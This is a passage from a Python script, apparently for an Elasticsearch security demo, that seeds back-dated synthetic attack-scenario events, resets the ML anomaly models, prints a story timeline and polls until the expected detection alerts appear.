    ap.add_argument("--wait", type=int, default=0, help="seconds to poll for alerts after seeding")
    a = ap.parse_args()
    if not (ES and KEY):
        sys.exit("Set ELASTICSEARCH_URL / ELASTICSEARCH_API_KEY (source env.sh)")
    if a.status:
        status()
        return
    reset(old=a.reset)
    ensure_crown_jewel()
    ev, t = build()
    print(f"\nSeeding {len(ev)} events")
    bulk(ev)
    ensure_crown_jewel(wait=False)            # re-assert after the entity engine sees the new events
    if a.ml_reset:
        # AFTER seeding: the relearn reads 35 days of baseline and then the attack, so the models
        # score it as new. (Seeded events are back-dated; a datafeed already running in real time
        # has searched past those minutes and would never see them.)
        ml_reset()
    print("\nStory timeline (UTC):")
    for k, v in t.items():
        print(f"  {v.strftime('%H:%M:%S')}  {k.replace('_', ' ')}")
    print(f"\nAll alerts land within 'Last 24 hours'. Rules run every 5 min.")
    if a.wait:
        deadline = time.time() + a.wait
        while time.time() < deadline:
            time.sleep(60)
            print(f"\n[{datetime.now(timezone.utc).strftime('%H:%M:%S')}]")
            if status() >= len(EXPECTED):
                break


if __name__ == "__main__":
    main()
